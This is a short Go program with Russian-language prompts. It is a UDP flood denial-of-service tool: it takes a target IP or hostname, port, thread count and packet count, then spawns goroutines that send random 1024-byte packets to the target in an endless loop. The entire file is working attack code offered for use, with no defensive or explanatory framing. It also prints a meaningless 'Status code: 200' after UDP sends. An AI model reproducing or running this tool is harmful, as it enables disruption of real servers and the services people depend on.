package main

import (
    "fmt"
    "math/rand"
    "net"
    "os"
    "os/signal"
    "strings"
    "syscall"
)

var host string
var port int
var threads int
var packets int

func main() {
    fmt.Print("Введите айпи сервера: ")
    fmt.Scanln(&host)
    fmt.Print("Порт: ")
    fmt.Scanln(&port)
    fmt.Print("Кол-во потоков: ")
    fmt.Scanln(&threads)
    fmt.Print("Кол-во пакетов за поток: ")
    fmt.Scanln(&packets)

    ip := host
    if !isIPAddress(host) {
        ips, err := net.LookupIP(host)
        if err != nil {
            fmt.Println("Ошибка:", err)
            return
        }
        ip = ips[0].String()
    }

    fmt.Printf("Статичный IP сервера %s: %s\n", host, ip)
    fmt.Scanln()
    runDosAttack(ip, port, threads, packets)

    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    <-c
    fmt.Println("\nВыход...")
}

func isIPAddress(host string) bool {
    parts := strings.Split(host, ".")
    if len(parts) != 4 {
        return false
    }
    for _, p := range parts {
        if len(p) == 0 {
            return false
        }
    }
    return true
}

func runDosAttack(ip string, port, threads, packets int) {
    for i := 0; i < threads; i++ {
        go func() {
            for {
                data := make([]byte, 1024)
                rand.Read(data)
                addr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", ip, port))
                if err != nil {
                    fmt.Println("\033[31mError:", err, "\033[0m")
                    return
                }

                conn, err := net.DialUDP("udp4", nil, addr)
                if err != nil {
                    fmt.Println("\033[31mError:", err, "\033[0m")
                    return
                }

                for j := 0; j < packets; j++ {
                    _, err := conn.Write(data)
                    if err != nil {
                        fmt.Println("\033[31mError:", err, "\033[0m")
                        conn.Close()
                        return
                    }
                }
                fmt.Println("\033[32mSuccessfully! Status code: 200\033[0m")
                conn.Close()
            }
        }()
    }
}